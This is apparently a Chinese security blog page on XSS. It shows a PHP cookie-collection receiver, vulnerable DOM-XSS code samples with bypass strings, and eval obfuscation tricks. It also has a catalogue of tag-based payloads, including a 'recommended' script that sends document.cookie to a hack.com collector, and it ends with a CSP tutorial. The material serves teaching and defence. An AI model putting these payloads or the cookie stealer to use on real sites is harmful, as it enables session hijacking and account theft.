<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">'cookie'</span>]) &amp;&amp; isset(<span class="variable">$_REQUEST</span>[<span class="string">'location'</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cookie</span> = <span class="variable">$_REQUEST</span>[<span class="string">'cookie'</span>];</span><br><span class="line">        <span class="variable">$location</span> = <span class="variable">$_REQUEST</span>[<span class="string">'location'</span>];</span><br><span class="line">        <span class="variable">$stri</span> = <span class="string">"&lt;td&gt;"</span>.date(DATE_ATOM).<span class="string">"&lt;/td&gt;&lt;td&gt;Cookie:"</span>.<span class="variable">$cookie</span>.<span class="string">"&lt;/td&gt;&lt;td&gt;Location:"</span>.<span class="variable">$location</span>.<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">        <span class="variable">$fp</span> = file_put_contents(<span class="string">"xss.txt"</span>, <span class="variable">$stri</span>.<span class="string">"\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = file_get_contents(<span class="string">"xss.txt"</span>);</span><br><span class="line">    <span class="variable">$data</span> = (explode(<span class="string">"\n"</span>, <span class="variable">$fp</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;table bode=\"1\"&gt;"</span>;</span><br><span class="line">    foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$value</span> == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.(<span class="variable">$key</span>).<span class="string">"&lt;/td&gt;"</span>.<span class="variable">$value</span>.<span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><h2 id="在前端实现页面跳转"><a href="#在前端实现页面跳转" class="headerlink" title="在前端实现页面跳转"></a>在前端实现页面跳转</h2><h3 id="使用indexOf判断URL参数是否合法"><a href="#使用indexOf判断URL参数是否合法" class="headerlink" title="使用indexOf判断URL参数是否合法"></a>使用indexOf判断URL参数是否合法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">emptyFn</span></span>()&#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>()&#123;</span><br><span class="line">    var jump = getQueryString(<span class="string">'jump'</span>);</span><br><span class="line">    jump = decodeURIComponent(jump);</span><br><span class="line">    <span class="keyword">if</span> (jump &amp;&amp; jump.indexOf(<span class="string">"tmast://"</span>) &gt; -1) &#123;</span><br><span class="line">        jump = jump;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        jump = <span class="string">"tmast://found"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        window.JSBReady(<span class="keyword">function</span>(readyState) &#123;</span><br><span class="line">            <span class="keyword">if</span> (readyState) &#123;</span><br><span class="line">                jsb(<span class="string">'closeWebView'</span>,0,<span class="string">'emptyFn'</span>,&#123;&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,1000);</span><br><span class="line">    location.href=jump;</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
<p>传入<code>javascript:alert(1);//tmast://</code></p>
<h3 id="正则表达式缺陷"><a href="#正则表达式缺陷" class="headerlink" title="正则表达式缺陷"></a>正则表达式缺陷</h3><p>示例缺陷代码 [1]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VaildURL(sUrl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> (/(https?:\/\/)?[\w\-.]+\.(qq|paipai|soso|taotao)\.com($|\/|\\)/i).<span class="built_in">test</span>(sUrl)||</span><br><span class="line">           (/^[\w][\w\/\.\-_%]+$/i).<span class="built_in">test</span>(sUrl)||(/^[\/\\][^\/\\]/i).<span class="built_in">test</span>(sUrl) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例缺陷代码 [2]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(typeof(pgvMain) == <span class="string">'function'</span>) &#123;</span><br><span class="line">           pgvMain();</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       var durl = window.location.search.substr(6);</span><br><span class="line"></span><br><span class="line">       var refer = document.referrer;</span><br><span class="line">       <span class="keyword">if</span>(/house.qq.com/.<span class="built_in">test</span>(refer) || refer == <span class="string">''</span>)&#123;</span><br><span class="line">           setTimeout(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">               window.location.replace(durl);</span><br><span class="line">           &#125;, 2000);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>神奇的符号 ^，加上和不加上，过滤的效果具有天壤之别。攻击者仍然可以构造 <code>javascript:alert(1);//http://www.qq.com</code>来绕过看似严格的过滤</p>
<h2 id="取值写入页面或动态执行"><a href="#取值写入页面或动态执行" class="headerlink" title="取值写入页面或动态执行"></a>取值写入页面或动态执行</h2><h3 id="URL中的取参数值写入页面或动态执行"><a href="#URL中的取参数值写入页面或动态执行" class="headerlink" title="URL中的取参数值写入页面或动态执行"></a>URL中的取参数值写入页面或动态执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> getParameter(name)&#123;</span><br><span class="line">            var r = new RegExp(<span class="string">"(\\?|#|&amp;)"</span> + name + <span class="string">"=([^&amp;#]*)(&amp;|#|$)"</span>), </span><br><span class="line">m = location.href.match(r);</span><br><span class="line">            <span class="built_in">return</span> (!m ? <span class="string">""</span> : m[2]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEvent(window, <span class="string">"load"</span>, init);</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>()&#123;</span><br><span class="line">		var msg=getParameter(<span class="string">"msg"</span>);</span><br><span class="line">		<span class="keyword">if</span>(msg==<span class="string">""</span>)msg=<span class="string">"服务器忙，请您稍候再试"</span></span><br><span class="line">		<span class="keyword">else</span> msg=unescape(msg);</span><br><span class="line">		var div=document.getElementById(<span class="string">"info"</span>);</span><br><span class="line">		<span class="keyword">if</span>(div) div.innerHTML=msg;</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/xxx.htm<span class="comment">#msg=&lt;img/src=x onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Cookie取参数值写入页面或动态执行"><a href="#Cookie取参数值写入页面或动态执行" class="headerlink" title="Cookie取参数值写入页面或动态执行"></a>Cookie取参数值写入页面或动态执行</h3><p>示例缺陷代码[1]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> goto_adtag_url(url, <span class="built_in">type</span>) &#123;</span><br><span class="line">    var userInfo = getCookie(COOKIE_USERINFO);</span><br><span class="line">    userInfo = decodeURIComponent(userInfo);</span><br><span class="line">    <span class="keyword">if</span> (userInfo != <span class="string">''</span>) &#123;</span><br><span class="line">        userInfo = userInfo.replace(/&lt;/g, <span class="string">'\\&lt;'</span>);</span><br><span class="line">        userInfo = userInfo.replace(/&gt;/g, <span class="string">'\\&gt;'</span>);</span><br><span class="line">        userInfo = <span class="built_in">eval</span>(<span class="string">'('</span> + userInfo + <span class="string">')'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例缺陷代码[2]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getISP</span></span>()&#123;var _ptisp = getCookie(<span class="string">"ptisp"</span>);</span><br><span class="line">				var isp = _ptisp ? (_ptisp + <span class="string">"."</span>) : <span class="string">""</span>;</span><br><span class="line">				<span class="built_in">return</span> isp;</span><br><span class="line">			&#125;</span><br><span class="line">window.isp = getISP();</span><br><span class="line">window.mainPath = <span class="string">"http://"</span> + window.isp + <span class="string">"qzs.qq.com"</span>;</span><br><span class="line">window.filePath = <span class="string">"http://"</span> + window.isp + <span class="string">"i.gtimg.cn"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="localStorage、Referer、Window-name、SessionStorage"><a href="#localStorage、Referer、Window-name、SessionStorage" class="headerlink" title="localStorage、Referer、Window name、SessionStorage"></a>localStorage、Referer、Window name、SessionStorage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var payload = window.name;</span><br><span class="line"></span><br><span class="line">     setTimeout(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">           trigger(window.name);</span><br><span class="line">     &#125;, 1);</span><br><span class="line">     var div = document.createElement(<span class="string">'div'</span>);</span><br><span class="line">     document.documentElement.appendChild(div);</span><br><span class="line"></span><br><span class="line">     div.innerHTML = payload;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">function</span> trigger(payload) &#123;</span><br><span class="line">           div.innerHTML = payload;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>
<p>构造</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">'http://localhost/domxss_47/index.php'</span> name=<span class="string">'&lt;svg/onload=alert(1)&gt;'</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>写入页面前先转义。在取值写入页面或动态执行的业务场景下，在将各种来源获取到的参数值传入JavaScript“三姐妹”函数（innerHTML、document.write、eval）处理前，对传入数据中的HTML特殊字符进行转义处理能防止大部分DOM-XSS的产生。此外，根据不同业务的真实情况，还应使用正则表达式，针对传入的数据做更严格的过滤限制，才能保证万无一失</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> htmlEscape(str) &#123;</span><br><span class="line">    <span class="built_in">return</span> str</span><br><span class="line">        .replace(/&amp;/g, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">        .replace(/<span class="string">"/g, '&amp;quot;')</span></span><br><span class="line"><span class="string">        .replace(/'/g, '&amp;#39;')</span></span><br><span class="line"><span class="string">        .replace(/&lt;/g, '&amp;lt;')</span></span><br><span class="line"><span class="string">        .replace(/&gt;/g, '&amp;gt;');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Value = htmlEscape(value);</span></span><br><span class="line"><span class="string">  div.innerHTML = value;</span></span><br></pre></td></tr></table></figure>
<p>慎用危险的“eval”。需要强调的是，由于JavaScript中的eval函数十分灵活，能够支持执行的字符串编码纷繁复杂。强烈建议，不到万不得已，不要使用eval函数处理不可控的外部数据<br>看下边的示例:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(unescape(<span class="string">"%64%6f...."</span>));&lt;/script&gt;</span><br><span class="line">在JavaScript 中可以直接通过<span class="built_in">eval</span> 执行的字符串有八进制和十六进制 两种编码方式</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"\141\154\145\162\164\50\47\u4f60\u597d\47\51"</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"\x61\x6c\x65\x72\x74\x28\x27\u4f60\u597d\x27\x29"</span>);&lt;/script&gt;</span><br><span class="line">另外，虽然十进制不能直接通过 <span class="built_in">eval</span> 来执行，但可以用 String.fromCharCode 函数先对数值进行解码，然后传递给 <span class="built_in">eval</span> 执行</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(String.fromCharCode(97, 108, 101, ...));&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1 id="标签利用"><a href="#标签利用" class="headerlink" title="标签利用"></a>标签利用</h1><h2 id="img"><a href="#img" class="headerlink" title="img"></a>img</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xss利用方式1(推荐)</span><br><span class="line">&lt;script&gt;document.body.appendChild(document.createElement(<span class="string">'img'</span>)).setAttribute(<span class="string">'src'</span>,<span class="string">'http://www.hack.com/cookie.php?cookie='</span>+document.cookie); &lt;/script&gt;   </span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src=1onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="a"><a href="#a" class="headerlink" title="a"></a>a</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">"javascript:aaa"</span>onmouseover=<span class="string">"alert(/xss/)"</span>&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br><span class="line">&lt;a href=<span class="string">""</span>onclick=alert(<span class="string">'xss'</span>)&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href=<span class="string">""</span>onclick=<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(<span class="string">'xss'</span>) y=2016&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>) bad=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="form"><a href="#form" class="headerlink" title="form"></a>form</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(21)&gt;M</span><br><span class="line">&lt;form/action=javascript:alert(22)&gt;&lt;input/<span class="built_in">type</span>=submit&gt;</span><br><span class="line">&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M</span><br></pre></td></tr></table></figure>
<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="string">"xss"</span>);&gt;&lt;/iframe&gt; </span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">'xss'</span>); height=5 width=10 /&gt;&lt;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=<span class="string">"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h2 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="detail"><a href="#detail" class="headerlink" title="detail"></a>detail</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=<span class="string">"alert('xss');"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<h2 id="video"><a href="#video" class="headerlink" title="video"></a>video</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;<span class="built_in">source</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></table></figure>
<h2 id="body"><a href="#body" class="headerlink" title="body"></a>body</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></table></figure>
<h2 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(<span class="string">"xss"</span>); autofocus&gt;</span><br></pre></td></tr></table></figure>
<h2 id="keygen"><a href="#keygen" class="headerlink" title="keygen"></a>keygen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a><br>内容安全策略(CSP),CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。     </p>
<h2 id="CSP启用方法"><a href="#CSP启用方法" class="headerlink" title="CSP启用方法"></a>CSP启用方法</h2><p>一种是通过 HTTP 头信息的Content-Security-Policy的字段  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
<p>另一种是通过网页的<meta>标签  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，CSP 做了如下配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">脚本：只信任当前域名</span><br><span class="line">&lt;object&gt;标签：不信任任何URL，即不加载任何资源</span><br><span class="line">样式表：只信任cdn.example.org和third-party.org</span><br><span class="line">框架（frame）：必须使用HTTPS协议加载</span><br><span class="line">其他资源：没有限制</span><br></pre></td></tr></table></figure>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载</p>
<h2 id="限制选项"><a href="#限制选项" class="headerlink" title="限制选项"></a>限制选项</h2><p><strong>资源加载限制</strong><br>以下选项限制各类资源的加载。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br></pre></td></tr></table></figure>
<p>*<em>default-src *</em><br>default-src用来设置上面各个选项的默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
<p>上面代码限制所有的外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值。</p>
<p><strong>URL 限制</strong><br>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br></pre></td></tr></table></figure>
<p><strong>其他限制</strong><br>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure>
<p><strong>report-uri</strong><br>有时，我们不仅希望防止 XSS，还希望记录此类行为。report-uri就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<p>上面代码指定，将注入行为报告给/my_amazing_csp_report_parser这个 URL。 </p>
<h2 id="Content-Security-Policy-Report-Only"><a href="#Content-Security-Policy-Report-Only" class="headerlink" title="Content-Security-Policy-Report-Only"></a>Content-Security-Policy-Report-Only</h2><p>除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。</p>
<p>它必须与report-uri选项配合使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>

<h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机名：example.org，https:&#x2F;&#x2F;example.com:443</span><br><span class="line">路径名：example.org&#x2F;resources&#x2F;js&#x2F;</span><br><span class="line">通配符：*.example.org，*:&#x2F;&#x2F;*.example.com:*（表示任意协议、任意子域名、任意端口）</span><br><span class="line">协议名：https:、data:</span><br><span class="line">关键字&#39;self&#39;：当前域名，需要加引号</span><br><span class="line">关键字&#39;none&#39;：禁止加载任何外部资源，需要加引号</span><br></pre></td></tr></table></figure>
<p>多个值也可以并列，用空格分隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;apis.google.com</span><br></pre></td></tr></table></figure>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
